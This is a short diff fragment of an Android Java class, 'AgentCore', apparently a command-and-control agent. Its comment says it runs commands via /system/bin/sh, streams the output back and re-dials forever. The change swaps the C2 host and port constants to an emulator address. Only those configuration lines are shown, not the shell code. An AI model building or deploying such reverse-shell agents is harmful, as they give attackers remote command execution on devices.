@@ -12,8 +12,8 @@ import java.io.InputStreamReader;
  * via /system/bin/sh, streams output back. Re-dials forever with backoff.
  */
 public final class AgentCore {
-    static final String C2_HOST = "192.0.2.1";  // ← replaced by build script
-    static final int C2_PORT = 11111;            // ← replaced by build script
+    static final String C2_HOST = "10.0.2.2";  // ← replaced by build script
+    static final int C2_PORT = 4445;            // ← replaced by build script
     static final byte[] MAGIC = "__DLS_AGENT__\n".getBytes();
     static final String MAGIC_STR = "__DLS_AGENT__";
 
